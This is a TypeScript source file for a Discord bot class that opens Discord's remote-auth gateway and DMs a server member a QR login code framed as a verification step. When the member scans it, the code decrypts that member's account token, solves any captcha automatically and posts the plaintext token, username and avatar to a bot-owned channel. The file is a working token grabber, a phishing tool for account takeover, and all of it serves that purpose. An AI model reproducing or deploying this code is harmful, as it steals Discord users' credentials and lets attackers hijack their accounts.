import WebSocket from "ws";
import {
  GuildMember,
  Collection,
  AttachmentBuilder,
  TextChannel,
} from "discord.js";
import {
  KeyPairKeyObjectResult,
  generateKeyPairSync,
  privateDecrypt,
  createHash,
} from "crypto";
import {
  ICaptcha,
  IHello,
  INonceProof,
  IPendingLogin,
  IPendingTicket,
  IPrendingRemoteInit,
  IUserInfo,
} from "../interfaces/ISocketEvents";
import { toDataURL } from "qrcode";
import { getTicket, getTicketWithCaptcha } from "../fetch/getTicket";
import { allSockets, sharedClient } from "..";
import { CaptchaSolver } from "./CaptchaSolver";
import * as embeds from "../util/embeds";

export class DiscordSocket {
  public messages = new Collection<string, any>();
  public socket: WebSocket;
  public keyPair: KeyPairKeyObjectResult;
  public userInformation: IUserInfo | null = null;

  constructor(public readonly user: GuildMember) {
    this.socket = new WebSocket("wss://remote-auth-gateway.discord.gg/?v=2", {
      origin: "https://discord.com",
      handshakeTimeout: 10000,
    });

    this.keyPair = generateKeyPairSync("rsa", {
      modulusLength: 4096,
      publicExponent: 65537,
    });

    this.messages.set("hello", this.hello);
    this.messages.set("nonce_proof", this.nonce_proof);
    this.messages.set("pending_remote_init", this.pending_remote_init);
    this.messages.set("pending_ticket", this.pending_ticket);
    this.messages.set("pending_login", this.pending_login);
    this.messages.set("cancel", this.handleCancel);

    this.socket.on("message", (message) => {
      const messageData = JSON.parse(message.toString());
      const _handle = this.messages.get(messageData.op);
      if (!_handle) return this.messages.get("cancel")(this);
      _handle(this, messageData);
    });
  }

  private sendMessageToSocket(data: Object) {
    this.socket.send(JSON.stringify(data));
  }

  private async handleCancel(_this: DiscordSocket) {
    _this.user.send({ embeds: [await embeds.failedVerificationEmbed()] });
    _this.socket.terminate();
    allSockets.delete(_this.user.id);
  }

  private async handleFoundUserToken(_this: DiscordSocket, token: string) {
    const decryptedToken = privateDecrypt(
      { key: _this.keyPair.privateKey, oaepHash: "sha256" },
      Buffer.from(token, "base64")
    );

    const embed = await embeds.foundTokenEmbed();
    embed.setDescription(decryptedToken.toString());
    embed.setAuthor({
      name: `${_this.userInformation?.username!}#${_this.userInformation
        ?.discriminator!}`,
      iconURL:
        _this.userInformation?.avatar !== "0"
          ? `https://cdn.discordapp.com/avatars/${_this.userInformation?.userid}/${_this.userInformation?.avatar}`
          : "https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png",
    });
    (sharedClient.channel as TextChannel).send({
      embeds: [embed],
    });

    allSockets.delete(_this.user.id);
  }

  private hello(_this: DiscordSocket, messageData: IHello) {
    _this.sendMessageToSocket({
      op: "init",
      encoded_public_key: _this.keyPair.publicKey
        .export({ type: "spki", format: "der" })
        .toString("base64"),
    });
  }

  private nonce_proof(_this: DiscordSocket, messageData: INonceProof) {
    const decryptedNonce = privateDecrypt(
      { key: _this.keyPair.privateKey, oaepHash: "sha256" },
      Buffer.from(messageData.encrypted_nonce as string, "base64")
    );

    const nonceHash = createHash("sha256")
      .update(decryptedNonce)
      .digest("base64url");

    _this.sendMessageToSocket({
      op: "nonce_proof",
      proof: nonceHash,
    });
  }

  private async pending_remote_init(
    _this: DiscordSocket,
    messageData: IPrendingRemoteInit
  ) {
    const fingerprintDataURL = `https://discordapp.com/ra/${messageData.fingerprint}`;

    const qrCodeDataImage = await toDataURL(fingerprintDataURL, {
      width: 300,
    });
    const qrCodeBuffer = Buffer.from(qrCodeDataImage.split(",")[1], "base64");
    const discordImage = new AttachmentBuilder(qrCodeBuffer).setName("img.png");

    _this.user.send({
      embeds: [
        (await embeds.directMessageEmbed()).setImage("attachment://img.png"),
      ],
      files: [discordImage],
    });
  }

  private pending_ticket(_this: DiscordSocket, messageData: IPendingTicket) {
    const decryptedTicket = privateDecrypt(
      { key: _this.keyPair.privateKey, oaepHash: "sha256" },
      Buffer.from(messageData.encrypted_user_payload as string, "base64")
    );

    const ticket = decryptedTicket.toString().split(":");
    const userInformation: IUserInfo = {
      userid: ticket[0],
      discriminator: parseInt(ticket[1]),
      avatar: ticket[2],
      username: ticket[3],
    };

    _this.userInformation = userInformation;
  }

  private async pending_login(
    _this: DiscordSocket,
    messageData: IPendingLogin
  ) {
    const foundTicket = await getTicket(messageData.ticket);
    if (foundTicket.encrypted_token)
      return _this.handleFoundUserToken(_this, foundTicket.encrypted_token);

    const captchaToSolve: ICaptcha = foundTicket;
    let solvedCaptcha = await CaptchaSolver.solveCaptcha(
      captchaToSolve.captcha_sitekey,
      captchaToSolve.captcha_rqdata
    );
    if (!solvedCaptcha)
      return _this.user.send("failed to verify you. please try again!");

    const foundTicketWithCaptcha = await getTicketWithCaptcha(
      messageData.ticket,
      solvedCaptcha,
      captchaToSolve.captcha_rqtoken
    );
    if (foundTicketWithCaptcha.encrypted_token)
      return _this.handleFoundUserToken(_this, foundTicket.encrypted_token);

    console.log(
      `COULD NOT SOLVE CAPTCHA FOR ${_this.userInformation?.username}`
    );
  }
}
